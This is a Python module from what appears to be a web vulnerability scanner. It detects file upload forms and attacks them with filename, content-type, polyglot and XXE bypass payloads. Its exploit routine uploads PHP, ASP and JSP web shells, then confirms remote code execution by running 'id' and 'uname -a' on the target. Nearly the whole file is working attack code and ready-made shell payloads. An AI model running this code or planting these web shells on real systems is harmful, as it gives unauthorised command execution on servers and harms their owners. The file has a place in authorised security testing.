import re
import base64
from urllib.parse import urljoin, urlparse
from modules.base import BaseModule

class UploadModule(BaseModule):
    name = "upload"
    description = "File Upload Vulnerability Scanner"
    exploitable = True
    
    upload_indicators = [
        r'<input[^>]+type=["\']?file',
        r'enctype=["\']?multipart/form-data',
        r'upload',
        r'attach',
        r'import',
        r'avatar',
        r'profile.?pic',
        r'image',
        r'photo',
        r'resume',
        r'cv',
    ]
    
    dangerous_extensions = [
        ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".phar", ".phps",
        ".asp", ".aspx", ".ashx", ".asmx", ".cer", ".asa", ".asax", ".ascx",
        ".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".war",
        ".cfm", ".cfml", ".cfc",
        ".pl", ".cgi", ".py", ".rb", ".sh", ".bash",
        ".htaccess", ".htpasswd", ".config", ".inc",
        ".shtml", ".shtm", ".stm",
        ".svg", ".html", ".htm", ".xhtml", ".xht",
        ".ssi", ".ejs", ".tpl",
    ]
    
    bypass_techniques = [
        ("shell.php", "Direct PHP"),
        ("shell.php.jpg", "Double extension"),
        ("shell.jpg.php", "Reverse double extension"),
        ("shell.php%00.jpg", "Null byte (URL encoded)"),
        ("shell.php%0a.jpg", "Newline bypass"),
        ("shell.pHp", "Case manipulation"),
        ("shell.PHP", "Uppercase"),
        ("shell.pHp7", "Mixed case PHP7"),
        ("shell.php ", "Trailing space"),
        ("shell.php.", "Trailing dot"),
        ("shell.php...", "Multiple dots"),
        ("shell.php::$DATA", "NTFS ADS"),
        ("shell.php::$DATA.jpg", "NTFS ADS with ext"),
        ("shell.php;.jpg", "Semicolon bypass"),
        ("shell.php%00", "Null byte terminator"),
        ("shell.phtml", "PHTML"),
        ("shell.php5", "PHP5"),
        ("shell.php7", "PHP7"),
        ("shell.phar", "PHAR archive"),
        ("shell.pHar", "PHAR mixed case"),
        (".htaccess", "Apache config"),
        ("shell.php\x00.jpg", "Raw null byte"),
        ("shell.php/.jpg", "Path confusion"),
        ("shell.php%20", "URL encoded space"),
        ("shell.php%0d%0a.jpg", "CRLF injection"),
        ("....//....//shell.php", "Path traversal"),
        ("shell.php#.jpg", "Fragment bypass"),
        ("shell.php?v=.jpg", "Query string bypass"),
        ("shell\t.php", "Tab character"),
        ("shell.inc", "Include file"),
        ("shell.module", "Module file"),
        ("shell.php:Zone.Identifier", "ADS Zone ID"),
    ]
    
    magic_bytes = {
        "gif": b"GIF89a",
        "jpg": b"\xff\xd8\xff\xe0",
        "png": b"\x89PNG\r\n\x1a\n",
        "pdf": b"%PDF-1.4",
        "zip": b"PK\x03\x04",
        "bmp": b"BM",
        "webp": b"RIFF",
    }
    
    polyglot_payloads = {
        "gif_php": b"GIF89a<?php system($_GET['c']); ?>",
        "jpg_php": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php system($_GET['c']); ?>",
        "png_php": b"\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>",
        "svg_xss": b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        "html_php": b"<html><body><?php system($_GET['c']); ?></body></html>",
    }

    file_format_abuse = [
        (b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj", "pdf", "PDF parser abuse"),
        (b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "xml", "XXE file read"),
        (b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta">]><foo>&xxe;</foo>', "xml", "XXE SSRF"),
        (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "xss.svg", "SVG XSS"),
    ]

    async def scan(self, target):
        self.findings = []
        upload_forms = await self._find_upload_forms(target)
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        seen_actions = {urljoin(target, f.get("action", "")) for f in upload_forms}
        for path in ["/upload", "/profile", "/settings", "/account", "/user/edit", "/admin/upload"]:
            u = urljoin(base, path)
            if u == target:
                continue
            more = await self._find_upload_forms(u)
            for f in more:
                act = urljoin(u, f.get("action", ""))
                if act not in seen_actions:
                    seen_actions.add(act)
                    upload_forms.append(f)
        if upload_forms:
            self.add_finding(
                "INFO",
                f"Found {len(upload_forms)} upload form(s)",
                url=target,
                evidence="File upload functionality detected"
            )
            
            for form in upload_forms:
                await self._test_upload_bypasses(target, form)
                await self._test_polyglot_uploads(target, form)
                await self._test_content_type_bypass(target, form)
                await self._test_size_bypass(target, form)
                await self._test_file_format_abuse(target, form)
        
        await self._check_upload_directories(target)
        await self._check_api_uploads(target)
        
        return self.findings
    
    async def _find_upload_forms(self, target):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return []
        
        forms = []
        text = resp["text"]
        
        for pattern in self.upload_indicators[:2]:
            if re.search(pattern, text, re.IGNORECASE):
                form_matches = re.findall(r'<form[^>]*>.*?</form>', text, re.DOTALL | re.IGNORECASE)
                for form in form_matches:
                    if re.search(r'type=["\']?file', form, re.IGNORECASE):
                        action = re.search(r'action=["\']?([^"\'>\s]+)', form, re.IGNORECASE)
                        forms.append({
                            "action": action.group(1) if action else target,
                            "html": form
                        })
        
        return forms
    
    async def _test_upload_bypasses(self, target, form):
        action = form.get("action", target)
        if not action.startswith("http"):
            action = urljoin(target, action)
        
        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
        if not input_name:
            input_name = re.search(r'<input[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+type=["\']?file', form["html"], re.IGNORECASE)
        
        field_name = input_name.group(1) if input_name else "file"
        
        test_content = b"GIF89a\n<?php echo 'LANTERN_UPLOAD_TEST'; ?>"
        
        bypass_list = self.bypass_techniques[:8]
        if self.aggressive:
            bypass_list = self.bypass_techniques[:20]
        
        for filename, technique in bypass_list:
            try:
                import aiohttp
                data = aiohttp.FormData()
                data.add_field(field_name, test_content, filename=filename, content_type="image/gif")
                
                resp = await self.http.request("POST", action, data=data)
                
                if resp.get("status") in [200, 201, 302]:
                    text = resp.get("text", "").lower()
                    
                    if any(x in text for x in ["success", "uploaded", "complete", "saved"]):
                        confidence_evidence = ["upload_accepted", "bypass_technique"]
                        if ".php" in filename.lower():
                            confidence_evidence.append("php_extension")
                        
                        self.add_finding(
                            "CRITICAL",
                            f"File upload bypass: {technique}",
                            url=action,
                            parameter=field_name,
                            evidence=f"Filename: {filename}",
                            confidence_evidence=confidence_evidence,
                            request_data={"method": "POST", "url": action, "field": field_name, "filename": filename}
                        )
                        return
                    
                    if "error" not in text and "invalid" not in text and "denied" not in text:
                        confidence_evidence = ["no_rejection", "bypass_technique"]
                        
                        self.add_finding(
                            "HIGH",
                            f"Possible file upload bypass: {technique}",
                            url=action,
                            parameter=field_name,
                            evidence=f"Filename: {filename}, no rejection detected",
                            confidence_evidence=confidence_evidence,
                            request_data={"method": "POST", "url": action, "field": field_name, "filename": filename}
                        )
                        return
            except:
                pass
        
        content_types = [
            ("image/gif", "GIF magic bytes"),
            ("image/jpeg", "JPEG content-type"),
            ("image/png", "PNG content-type"),
            ("application/octet-stream", "Binary stream"),
        ]
        
        for content_type, technique in content_types:
            try:
                import aiohttp
                data = aiohttp.FormData()
                data.add_field(field_name, test_content, filename="shell.php", content_type=content_type)
                resp = await self.http.request("POST", action, data=data)
                if resp.get("status") in [200, 201, 302]:
                    text = resp.get("text", "").lower()
                    if "error" not in text and "invalid" not in text:
                        confidence_evidence = ["content_type_bypass"]
                        
                        self.add_finding(
                            "MEDIUM",
                            f"Content-Type bypass possible: {technique}",
                            url=action,
                            evidence=f"Content-Type: {content_type}",
                            confidence_evidence=confidence_evidence
                        )
                        return
            except Exception:
                pass

    async def _test_file_format_abuse(self, target, form):
        action = form.get("action", target)
        if not action.startswith("http"):
            action = urljoin(target, action)
        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
        field_name = input_name.group(1) if input_name else "file"
        for payload_bytes, ext, label in self.file_format_abuse:
            try:
                import aiohttp
                data = aiohttp.FormData()
                data.add_field(field_name, payload_bytes, filename=f"test.{ext}", content_type="application/octet-stream")
                resp = await self.http.request("POST", action, data=data)
                if resp.get("status") not in [200, 201, 302]:
                    continue
                text = (resp.get("text") or "").lower()
                if "root:" in text or "passwd" in text:
                    self.add_finding("CRITICAL", f"File-format abuse: XXE file read via {ext}", url=action, parameter=field_name, evidence=label)
                    return
                if "ami-id" in text or "instance-id" in text:
                    self.add_finding("CRITICAL", f"File-format abuse: XXE SSRF via {ext}", url=action, parameter=field_name, evidence=label)
                    return
                if "error" not in text and "invalid" not in text:
                    self.add_finding("MEDIUM", f"File-format abuse payload accepted: {label}", url=action, parameter=field_name, evidence=f"Filename: test.{ext}")
            except Exception:
                pass

    async def _check_upload_directories(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        upload_paths = [
            "/uploads/", "/upload/", "/files/", "/attachments/",
            "/images/uploads/", "/media/uploads/", "/assets/uploads/",
            "/wp-content/uploads/", "/user_uploads/", "/tmp/",
            "/storage/", "/public/uploads/", "/data/uploads/",
        ]
        
        for path in upload_paths:
            resp = await self.http.get(f"{base}{path}")
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "index of" in text.lower() or "directory listing" in text.lower():
                    self.add_finding(
                        "HIGH",
                        f"Upload directory listing exposed",
                        url=f"{base}{path}",
                        evidence="Directory contents visible"
                    )
                elif len(text) > 100:
                    self.add_finding(
                        "LOW",
                        f"Upload directory accessible",
                        url=f"{base}{path}",
                        evidence="Path exists and returns content"
                    )
    
    async def _test_polyglot_uploads(self, target, form):
        action = form.get("action", target)
        if not action.startswith("http"):
            action = urljoin(target, action)
        
        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
        field_name = input_name.group(1) if input_name else "file"
        
        for poly_name, poly_content in self.polyglot_payloads.items():
            try:
                import aiohttp
                
                if "php" in poly_name:
                    filenames = [f"test.{poly_name.split('_')[0]}", f"test.{poly_name.split('_')[0]}.php"]
                else:
                    filenames = [f"test.{poly_name.split('_')[0]}"]
                
                for filename in filenames:
                    data = aiohttp.FormData()
                    data.add_field(field_name, poly_content, filename=filename, content_type="image/gif")
                    
                    resp = await self.http.request("POST", action, data=data)
                    
                    if resp.get("status") in [200, 201, 302]:
                        text = resp.get("text", "").lower()
                        
                        if "success" in text or "uploaded" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"Polyglot upload accepted: {poly_name}",
                                url=action,
                                parameter=field_name,
                                evidence=f"Filename: {filename}"
                            )
                            return
            except:
                pass
    
    async def _test_content_type_bypass(self, target, form):
        action = form.get("action", target)
        if not action.startswith("http"):
            action = urljoin(target, action)
        
        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
        field_name = input_name.group(1) if input_name else "file"
        
        php_content = b"<?php system($_GET['c']); ?>"
        
        content_type_bypasses = [
            ("image/gif", "GIF content-type"),
            ("image/jpeg", "JPEG content-type"),
            ("image/png", "PNG content-type"),
            ("image/svg+xml", "SVG content-type"),
            ("text/plain", "Text content-type"),
            ("application/octet-stream", "Binary content-type"),
            ("image/gif\x00", "Null byte in content-type"),
            ("image/gif; charset=php", "Charset bypass"),
        ]
        
        for content_type, technique in content_type_bypasses:
            try:
                import aiohttp
                data = aiohttp.FormData()
                data.add_field(field_name, php_content, filename="shell.php", content_type=content_type)
                
                resp = await self.http.request("POST", action, data=data)
                
                if resp.get("status") in [200, 201, 302]:
                    text = resp.get("text", "").lower()
                    if "error" not in text and "invalid" not in text and "denied" not in text:
                        self.add_finding(
                            "HIGH",
                            f"Content-Type bypass: {technique}",
                            url=action,
                            parameter=field_name,
                            evidence=f"Content-Type: {content_type}"
                        )
                        return
            except:
                pass
    
    async def _test_size_bypass(self, target, form):
        action = form.get("action", target)
        if not action.startswith("http"):
            action = urljoin(target, action)
        
        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
        field_name = input_name.group(1) if input_name else "file"
        
        try:
            import aiohttp
            
            small_php = b"<?=`$_GET[c]`?>"
            data = aiohttp.FormData()
            data.add_field(field_name, small_php, filename="s.php", content_type="image/gif")
            
            resp = await self.http.request("POST", action, data=data)
            
            if resp.get("status") in [200, 201, 302]:
                text = resp.get("text", "").lower()
                if "error" not in text:
                    self.add_finding(
                        "HIGH",
                        f"Minimal PHP shell accepted (15 bytes)",
                        url=action,
                        parameter=field_name,
                        evidence="Short tag PHP shell uploaded"
                    )
        except:
            pass
    
    async def _check_api_uploads(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        api_endpoints = [
            "/api/upload", "/api/file", "/api/attachment",
            "/api/v1/upload", "/api/v2/upload",
            "/upload/api", "/file/upload",
            "/api/image", "/api/avatar", "/api/media",
        ]
        
        for endpoint in api_endpoints:
            resp = await self.http.get(f"{base}{endpoint}")
            
            if resp.get("status") in [200, 400, 401, 405]:
                php_b64 = base64.b64encode(b"<?php system($_GET['c']); ?>").decode()
                
                json_payloads = [
                    {"file": php_b64, "filename": "shell.php"},
                    {"data": php_b64, "name": "shell.php"},
                    {"content": php_b64, "path": "shell.php"},
                    {"image": f"data:image/gif;base64,{php_b64}"},
                ]
                
                for payload in json_payloads:
                    resp = await self.http.post(f"{base}{endpoint}", json=payload)
                    
                    if resp.get("status") in [200, 201]:
                        text = resp.get("text", "").lower()
                        if "success" in text or "url" in text or "path" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"API file upload accepts base64 PHP",
                                url=f"{base}{endpoint}",
                                evidence="JSON-based upload vulnerability"
                            )
                            return
    
    async def exploit(self, target, finding):
        from core.utils import random_string
        import aiohttp
        
        extracted = {"shells": [], "verified_rce": False, "shell_url": None, "server_info": {}}
        
        marker = random_string(16)
        
        shells = {
            "php": {
                "extensions": [".php", ".phtml", ".php5", ".php7", ".phar", ".inc"],
                "content": f'<?php echo "{marker}";if(isset($_GET["c"])){{system($_GET["c"]);}}if(isset($_POST["c"])){{system($_POST["c"]);}}?>',
                "verify": f"?c=id",
                "content_types": ["image/gif", "image/jpeg", "application/octet-stream"],
            },
            "php_short": {
                "extensions": [".php", ".phtml"],
                "content": f'<?="{marker}";`$_GET[c]`;?>',
                "verify": "?c=id",
                "content_types": ["image/gif"],
            },
            "asp": {
                "extensions": [".asp", ".aspx"],
                "content": f'<%Response.Write("{marker}")%><%eval request("c")%>',
                "verify": "",
                "content_types": ["application/octet-stream"],
            },
            "jsp": {
                "extensions": [".jsp", ".jspx"],
                "content": f'<%out.print("{marker}");%><%Runtime.getRuntime().exec(request.getParameter("c"));%>',
                "verify": "?c=id",
                "content_types": ["application/octet-stream"],
            },
        }
        
        form_data = finding.get("evidence", "")
        action = finding.get("url", target)
        param = finding.get("parameter", "file")
        
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        upload_dirs = ["/uploads/", "/upload/", "/files/", "/images/", "/media/", "/attachments/", "/assets/uploads/"]
        
        for shell_type, shell_config in shells.items():
            for ext in shell_config["extensions"]:
                for ct in shell_config["content_types"]:
                    for bypass_name, bypass_ext in self.bypass_techniques[:15]:
                        if ext in bypass_name or bypass_ext == "Direct PHP":
                            filename = bypass_name if ext in bypass_name else f"shell_{marker[:8]}{ext}"
                        else:
                            continue
                        
                        magic = self.magic_bytes.get("gif", b"GIF89a")
                        content = magic + shell_config["content"].encode()
                        
                        try:
                            data = aiohttp.FormData()
                            data.add_field(param, content, filename=filename, content_type=ct)
                            
                            resp = await self.http.request("POST", action, data=data)
                            
                            if resp.get("status") in [200, 201, 302]:
                                text = resp.get("text", "")
                                
                                url_match = re.search(r'(https?://[^\s"\'<>]+' + re.escape(filename.split(".")[0]) + r'[^\s"\'<>]*)', text)
                                path_match = re.search(r'["\']?(/[a-zA-Z0-9_/.-]+' + re.escape(filename.split(".")[0]) + r'[a-zA-Z0-9._-]*)["\']?', text)
                                
                                possible_urls = []
                                
                                if url_match:
                                    possible_urls.append(url_match.group(1))
                                if path_match:
                                    possible_urls.append(base + path_match.group(1))
                                
                                for upload_dir in upload_dirs:
                                    possible_urls.append(f"{base}{upload_dir}{filename}")
                                
                                for shell_url in possible_urls:
                                    verify_url = shell_url + shell_config["verify"]
                                    verify_resp = await self.http.get(verify_url)
                                    
                                    if verify_resp.get("status") == 200:
                                        text = verify_resp.get("text", "")
                                        
                                        if marker in text:
                                            extracted["verified_rce"] = True
                                            extracted["shell_url"] = shell_url
                                            extracted["shells"].append({
                                                "type": shell_type,
                                                "filename": filename,
                                                "url": shell_url,
                                                "bypass": bypass_ext
                                            })
                                            
                                            id_resp = await self.http.get(f"{shell_url}?c=id")
                                            if id_resp.get("status") == 200 and "uid=" in id_resp.get("text", ""):
                                                extracted["server_info"]["user"] = re.search(r'uid=\d+\([^)]+\)', id_resp.get("text", "")).group(0) if re.search(r'uid=\d+\([^)]+\)', id_resp.get("text", "")) else "unknown"
                                            
                                            uname_resp = await self.http.get(f"{shell_url}?c=uname+-a")
                                            if uname_resp.get("status") == 200:
                                                extracted["server_info"]["os"] = uname_resp.get("text", "")[:200]
                                            
                                            confidence_evidence = ["shell_uploaded", "marker_verified", "rce_confirmed"]
                                            if extracted["server_info"].get("user"):
                                                confidence_evidence.append("command_output")
                                            
                                            self.add_finding(
                                                "CRITICAL",
                                                f"UPLOAD EXPLOITED: RCE shell uploaded and verified!",
                                                url=shell_url,
                                                parameter=param,
                                                evidence=f"Shell type: {shell_type}, Execute: {shell_url}?c=COMMAND",
                                                confidence_evidence=confidence_evidence,
                                                request_data={"method": "GET", "url": f"{shell_url}?c=id"},
                                                response_data={"status": 200, "rce": True}
                                            )
                                            
                                            self.exploited_data = extracted
                                            return extracted
                        except:
                            pass
        
        return None
